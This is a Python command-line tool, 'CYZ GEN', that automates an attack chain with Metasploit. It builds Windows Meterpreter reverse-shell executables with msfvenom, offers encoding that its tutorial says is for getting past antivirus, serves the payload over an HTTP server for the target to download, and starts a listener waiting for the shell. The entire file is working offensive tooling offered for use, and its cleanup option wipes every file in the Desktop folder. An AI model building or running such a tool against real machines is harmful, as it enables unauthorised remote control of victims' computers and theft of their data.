#!/usr/bin/env python3
import os
import subprocess
import time
import sys
import platform
import requests  # Assure-toi d'avoir installé la bibliothèque via `pip install requests`
from colorama import init, Fore, Style

# Initialisation de Colorama
init(autoreset=True)

# Définir la version actuelle de l'application
VERSION = "1.0"

# Dictionnaires des messages pour chaque langue (anglais par défaut)
MESSAGES = {
    'en': {
        'banner': f"""
{Fore.CYAN}{Style.BRIGHT}
  ██████╗ ██╗   ██╗██╗      ██████╗      ██████╗ ███████╗███╗   ██╗
  ██╔══██╗██║   ██║██║     ██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║
  ██████╔╝██║   ██║██║     ██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║
  ██╔═══╝ ██║   ██║██║     ██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║
  ██║     ╚██████╔╝███████╗╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║
  ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝
          🐍 CYZ GEN — Python Reverse Shell Generator 🐍
Current Version: {VERSION}
""",
        'choose_language': "Choose language / Choisissez la langue:\n1) Français\n2) English (default)\n👉 Option (1/2): ",
        'menu': "\nMain Menu",
        'menu_options': [
            "1) Generate a payload",
            "2) Launch HTTP server",
            "3) Launch Metasploit handler",
            "4) Clean generated files",
            "5) Display credits",
            "6) Show tutorial",
            "7) Show system info",
            "8) About CYZ GEN",
            "9) Exit",
            "10) Check version / Update"
        ],
        'prompt_option': "\n👉 Choose an option (1-10): ",
        'prompt_payload_choice': "\n🎯 Choose your payload:\n1) windows/meterpreter/reverse_tcp\n2) windows/meterpreter/reverse_http\n3) windows/meterpreter/reverse_https\n👉 Option (1/2/3): ",
        'invalid_choice': "❌ Invalid choice. Try again.",
        'prompt_lhost': "\n🔹 LHOST (Kali IP): ",
        'prompt_lport': "🔹 LPORT (e.g., 4444): ",
        'prompt_filename': "🔹 Payload file name (e.g., payload.exe): ",
        'prompt_encoder': "Do you want to encode the payload? (y/n): ",
        'generating_payload': "\n📦 Generating payload with msfvenom...\n",
        'payload_generated': "\n✅ Payload generated at: ",
        'handler_created': "\n📝 handler.rc file created.",
        'launch_http': "\n🌐 Launching HTTP server (port 80) on the Desktop folder...",
        'terminal_not_found': "⚠️ Terminal not found. Please run manually:",
        'launch_msf': "\n💀 Launching Metasploit with handler.rc...\n",
        'cleanup_prompt': "\n🧹 Do you want to delete all files in {}? (y/n): ",
        'file_deleted': "Deleted: ",
        'handler_deleted': "handler.rc deleted.",
        'cleanup_cancelled': "Cleanup cancelled.",
        'credits': f"""
{Fore.MAGENTA}{Style.BRIGHT}
-------------------------------------------
             CYZ GEN Credits
-------------------------------------------
Developed by      : CYZ (Your Name)
Version           : {VERSION}
Inspired by       : Metasploit & Kali Linux
-------------------------------------------
Thank you for using CYZ GEN!
-------------------------------------------
""",
        'tutorial': f"""
{Fore.GREEN}{Style.BRIGHT}
-------------------------------------------
                  TUTORIAL
-------------------------------------------
1) Generate a payload:
   - Choose your payload type (e.g., reverse_tcp).
   - Enter your LHOST (Kali IP) and LPORT.
   - Optionally, encode the payload to help bypass antivirus.
   - The payload (.exe) will be saved in your Desktop folder.

2) Launch HTTP Server:
   - This starts a simple HTTP server on port 80 to distribute your payload.
   - Access it via http://<Kali_IP>/payload.exe from the target machine.

3) Launch Metasploit Handler:
   - Use the generated handler.rc to start a Metasploit listener.
   - Wait for the reverse shell connection.

4) Clean Generated Files:
   - Deletes the payload and handler.rc for cleanup.

Press Enter to return to the main menu.
-------------------------------------------
""",
        'about': f"""
{Fore.CYAN}{Style.BRIGHT}
-------------------------------------------
                 ABOUT CYZ GEN
-------------------------------------------
CYZ GEN is a modular Python CLI tool designed to assist penetration testers 
and security enthusiasts in generating reverse shell payloads quickly and efficiently.
It integrates with Metasploit, automates HTTP server setup, and supports multi-language output.
Developed with passion and inspired by the open-source community.
-------------------------------------------
""",
        'system_info': f"""
{Fore.YELLOW}{Style.BRIGHT}
-------------------------------------------
              SYSTEM INFO
-------------------------------------------
Platform   : {platform.system()} {platform.release()}
Processor  : {platform.processor()}
Python     : {platform.python_version()}
-------------------------------------------
""",
        'version_info': "\nCurrent version: " + VERSION + "\n",
        'exit_msg': "\n👋 Exiting CYZ GEN. Goodbye!",
        'press_enter': "\nPress Enter to return to the menu...",
        'interrupt': "\n👋 Interrupt detected. Exiting CYZ GEN."
    },
    'fr': {
        'banner': f"""
{Fore.CYAN}{Style.BRIGHT}
  ██████╗ ██╗   ██╗██╗      ██████╗      ██████╗ ███████╗███╗   ██╗
  ██╔══██╗██║   ██║██║     ██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║
  ██████╔╝██║   ██║██║     ██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║
  ██╔═══╝ ██║   ██║██║     ██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║
  ██║     ╚██████╔╝███████╗╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║
  ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝
         🐍 CYZ GEN — Générateur de Reverse Shell en Python 🐍
Version actuelle : {VERSION}
""",
        'choose_language': "Choisissez la langue / Choose language:\n1) Français\n2) English (défaut)\n👉 Option (1/2): ",
        'menu': "\nMenu Principal",
        'menu_options': [
            "1) Générer un payload",
            "2) Lancer le serveur HTTP",
            "3) Lancer le handler Metasploit",
            "4) Nettoyer les fichiers générés",
            "5) Afficher les crédits",
            "6) Afficher le tutoriel",
            "7) Afficher les infos système",
            "8) À propos de CYZ GEN",
            "9) Quitter",
            "10) Vérifier la version / Mise à jour"
        ],
        'prompt_option': "\n👉 Choisissez une option (1-10) : ",
        'prompt_payload_choice': "\n🎯 Choisissez votre payload :\n1) windows/meterpreter/reverse_tcp\n2) windows/meterpreter/reverse_http\n3) windows/meterpreter/reverse_https\n👉 Option (1/2/3) : ",
        'invalid_choice': "❌ Choix invalide. Réessayez.",
        'prompt_lhost': "\n🔹 LHOST (IP de Kali) : ",
        'prompt_lport': "🔹 LPORT (ex: 4444) : ",
        'prompt_filename': "🔹 Nom du fichier payload (ex: payload.exe) : ",
        'prompt_encoder': "Voulez-vous encoder le payload ? (y/n) : ",
        'generating_payload': "\n📦 Génération du payload avec msfvenom...\n",
        'payload_generated': "\n✅ Payload généré à : ",
        'handler_created': "\n📝 Fichier handler.rc créé.",
        'launch_http': "\n🌐 Lancement du serveur HTTP (port 80) sur le dossier Desktop...",
        'terminal_not_found': "⚠️ Terminal non trouvé. Lancez manuellement :",
        'launch_msf': "\n💀 Lancement de Metasploit avec handler.rc...\n",
        'cleanup_prompt': "\n🧹 Voulez-vous supprimer tous les fichiers dans {} ? (y/n) : ",
        'file_deleted': "Supprimé : ",
        'handler_deleted': "handler.rc supprimé.",
        'cleanup_cancelled': "Nettoyage annulé.",
        'credits': f"""
{Fore.MAGENTA}{Style.BRIGHT}
-------------------------------------------
             Crédits - CYZ GEN
-------------------------------------------
Développé par      : CYZ (Votre Nom)
Version            : {VERSION}
Inspiré par        : Metasploit & Kali Linux
-------------------------------------------
Merci d'utiliser CYZ GEN !
-------------------------------------------
""",
        'tutorial': f"""
{Fore.GREEN}{Style.BRIGHT}
-------------------------------------------
                  TUTORIEL
-------------------------------------------
1) Générer un payload :
   - Choisissez le type de payload (par ex., reverse_tcp).
   - Saisissez votre LHOST (IP de Kali) et LPORT.
   - Optionnellement, encodez le payload pour contourner certains antivirus.
   - Le payload (.exe) sera sauvegardé dans le dossier Desktop.

2) Lancer le serveur HTTP :
   - Démarre un serveur HTTP simple sur le port 80 pour distribuer votre payload.
   - Depuis la machine cible, accédez à http://<IP_Kali>/payload.exe.

3) Lancer le handler Metasploit :
   - Utilisez le fichier handler.rc généré pour démarrer un listener via Metasploit.
   - Attendez la connexion inverse (reverse shell).

4) Nettoyer les fichiers générés :
   - Supprimez le payload et le fichier handler.rc pour nettoyer le dossier Desktop.
   
Appuyez sur Entrée pour revenir au menu principal.
-------------------------------------------
""",
        'about': f"""
{Fore.CYAN}{Style.BRIGHT}
-------------------------------------------
              À PROPOS DE CYZ GEN
-------------------------------------------
CYZ GEN est un outil CLI modulaire écrit en Python pour aider les testeurs 
d'intrusion et les passionnés de sécurité à générer rapidement des payloads de reverse shell.
Il s'intègre avec Metasploit, automatise la configuration d'un serveur HTTP, 
et supporte le multilingue.
Développé avec passion et inspiré par la communauté open source.
-------------------------------------------
""",
        'system_info': f"""
{Fore.YELLOW}{Style.BRIGHT}
-------------------------------------------
              INFOS SYSTÈME
-------------------------------------------
Plateforme : {platform.system()} {platform.release()}
Processeur: {platform.processor()}
Python     : {platform.python_version()}
-------------------------------------------
""",
        'version_info': "\nVersion actuelle : " + VERSION + "\n",
        'exit_msg': "\n👋 Fermeture de CYZ GEN. À bientôt !",
        'press_enter': "\nAppuyez sur Entrée pour revenir au menu...",
        'interrupt': "\n👋 Interruption détectée. Fermeture de CYZ GEN."
    }
}

# Variable globale de langue (anglais par défaut)
LANG = 'en'

def select_language():
    global LANG
    choice = input(MESSAGES['en']['choose_language'])
    if choice.strip() == "1":
        LANG = 'fr'
    else:
        LANG = 'en'

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    clear()
    print(MESSAGES[LANG]['banner'])

def display_credits():
    clear()
    print(MESSAGES[LANG]['credits'])
    input(MESSAGES[LANG]['press_enter'])

def show_tutorial():
    clear()
    print(MESSAGES[LANG]['tutorial'])
    input(MESSAGES[LANG]['press_enter'])

def show_about():
    clear()
    print(MESSAGES[LANG]['about'])
    input(MESSAGES[LANG]['press_enter'])

def show_system_info():
    clear()
    print(MESSAGES[LANG]['system_info'])
    input(MESSAGES[LANG]['press_enter'])

def check_for_update():
    clear()
    print(Fore.YELLOW + (MESSAGES[LANG]['version_info']))
    print(Fore.YELLOW + "Checking for updates...")
    try:
        # L'URL doit pointer vers un fichier contenant la version, par exemple VERSION sur GitHub
        url = "https://raw.githubusercontent.com/lolo34dr/CYZ-GEN/main/VERSION"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            remote_version = response.text.strip()
            if remote_version != VERSION:
                print(Fore.GREEN + f"Update available: {remote_version} (current: {VERSION})")
                print("Please visit https://github.com/lolo34dr/CYZ-GEN to download the latest version.")
            else:
                print(Fore.GREEN + "You are using the latest version.")
        else:
            print(Fore.RED + "Error retrieving remote version.")
    except Exception as e:
        print(Fore.RED + f"Failed to check for updates: {e}")
    input(MESSAGES[LANG]['press_enter'])

def choose_payload():
    print(Fore.YELLOW + "\n" + MESSAGES[LANG]['prompt_payload_choice'])
    choice = input(Fore.CYAN)
    if choice == "1":
        return "windows/meterpreter/reverse_tcp"
    elif choice == "2":
        return "windows/meterpreter/reverse_http"
    elif choice == "3":
        return "windows/meterpreter/reverse_https"
    else:
        print(Fore.RED + MESSAGES[LANG]['invalid_choice'])
        return choose_payload()

def generate_payload():
    banner()
    print(Fore.YELLOW + "[1] " + MESSAGES[LANG]['menu_options'][0])
    payload = choose_payload()
    LHOST = input(Fore.CYAN + "\n" + MESSAGES[LANG]['prompt_lhost'])
    LPORT = input(Fore.CYAN + MESSAGES[LANG]['prompt_lport'])
    FILENAME = input(Fore.CYAN + MESSAGES[LANG]['prompt_filename'])
    use_encoder = input(Fore.CYAN + MESSAGES[LANG]['prompt_encoder']).lower()

    # Assurer que le dossier Desktop existe
    os.makedirs("/root/Desktop", exist_ok=True)
    output_path = os.path.join("/root/Desktop", FILENAME)

    print(Fore.YELLOW + MESSAGES[LANG]['generating_payload'])
    if use_encoder == 'y':
        msf_cmd = f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -e x86/shikata_ga_nai -i 10 -f exe -o {output_path}"
    else:
        msf_cmd = f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -f exe -o {output_path}"
    os.system(msf_cmd)
    print(Fore.GREEN + MESSAGES[LANG]['payload_generated'] + output_path)

    # Création du fichier handler.rc
    rc_script = f"""
use exploit/multi/handler
set payload {payload}
set LHOST {LHOST}
set LPORT {LPORT}
set ExitOnSession false
exploit -j -z
"""
    with open("handler.rc", "w") as f:
        f.write(rc_script)
    print(Fore.YELLOW + MESSAGES[LANG]['handler_created'])

def launch_http_server():
    print(Fore.YELLOW + "\n" + MESSAGES[LANG]['launch_http'])
    try:
        subprocess.Popen(["x-terminal-emulator", "-e", "bash", "-c", "cd /root/Desktop && python3 -m http.server 80"])
    except FileNotFoundError:
        print(Fore.RED + MESSAGES[LANG]['terminal_not_found'])
        print(Fore.RED + "   cd /root/Desktop && python3 -m http.server 80")
    time.sleep(2)

def launch_metasploit_handler():
    print(Fore.YELLOW + "\n" + MESSAGES[LANG]['launch_msf'])
    os.system("msfconsole -r handler.rc")

def cleanup_files():
    dir_path = "/root/Desktop"
    confirm = input(Fore.CYAN + MESSAGES[LANG]['cleanup_prompt'].format(dir_path)).lower()
    if confirm == 'y':
        for f in os.listdir(dir_path):
            file_path = os.path.join(dir_path, f)
            try:
                os.remove(file_path)
                print(Fore.GREEN + MESSAGES[LANG]['file_deleted'] + file_path)
            except Exception as e:
                print(Fore.RED + f"Error deleting {file_path}: {e}")
        if os.path.exists("handler.rc"):
            os.remove("handler.rc")
            print(Fore.GREEN + MESSAGES[LANG]['handler_deleted'])
    else:
        print(Fore.CYAN + MESSAGES[LANG]['cleanup_cancelled'])
    time.sleep(1)

def main_menu():
    while True:
        banner()
        print(Fore.YELLOW + "\n" + MESSAGES[LANG]['menu'])
        for option in MESSAGES[LANG]['menu_options']:
            print(Fore.GREEN + option)
        choice = input(Fore.CYAN + MESSAGES[LANG]['prompt_option'])
        if choice == "1":
            generate_payload()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "2":
            launch_http_server()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "3":
            launch_metasploit_handler()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "4":
            cleanup_files()
            input(Fore.CYAN + MESSAGES[LANG]['press_enter'])
        elif choice == "5":
            display_credits()
        elif choice == "6":
            show_tutorial()
        elif choice == "7":
            show_system_info()
        elif choice == "8":
            show_about()
        elif choice == "9":
            print(Fore.RED + MESSAGES[LANG]['exit_msg'])
            sys.exit(0)
        elif choice == "10":
            check_for_update()
        else:
            print(Fore.RED + MESSAGES[LANG]['invalid_choice'])
            time.sleep(1)

if __name__ == "__main__":
    try:
        select_language()
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + MESSAGES[LANG]['interrupt'])
